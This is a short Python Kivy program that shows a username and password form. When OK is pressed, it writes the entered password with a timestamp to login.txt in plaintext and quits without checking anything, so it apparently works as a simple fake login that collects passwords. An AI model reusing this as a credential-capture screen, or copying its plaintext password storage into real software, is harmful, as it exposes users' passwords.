from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from time import *

class MyApp(App):
    def callbackwrite(self, m):
        fopen = open('login.txt', 'a')
        asstmstr = localtime()
        dtstr = str(asstmstr[0]) + '.' + str(asstmstr[1]) + '.' + str(asstmstr[2])
        tmstr = str(asstmstr[3]) + ':' + str(asstmstr[4]) + ':' + str(asstmstr[5])

        fopen.write(dtstr + ' ' + tmstr + ' ' + self.pwordinput.text + '\n')
        fopen.close()
        exit()
    def build(self):
        self.rootlayout = FloatLayout()
        
        self.unamelabel = Label(text='Username:', pos=(100,500), size_hint = (.3,.1))
        self.unameinput = TextInput(multiline = False , pos=(310,500), size_hint = (0.3,0.1))

        self.pwordlabel = Label(text='Password', pos=(100,400), size_hint = (.3,.1))
        self.pwordinput = TextInput(multiline = False, password = True, pos=(310,400), size_hint = (0.3,0.1))

        self.buttonOk = Button(text='OK', pos = (600, 150), size_hint = (0.2,0.1), on_press=self.callbackwrite)

        self.rootlayout.add_widget(self.unamelabel)
        self.rootlayout.add_widget(self.unameinput)
        self.rootlayout.add_widget(self.pwordlabel)
        self.rootlayout.add_widget(self.pwordinput)
        self.rootlayout.add_widget(self.buttonOk)

        return self.rootlayout

MyApp().run()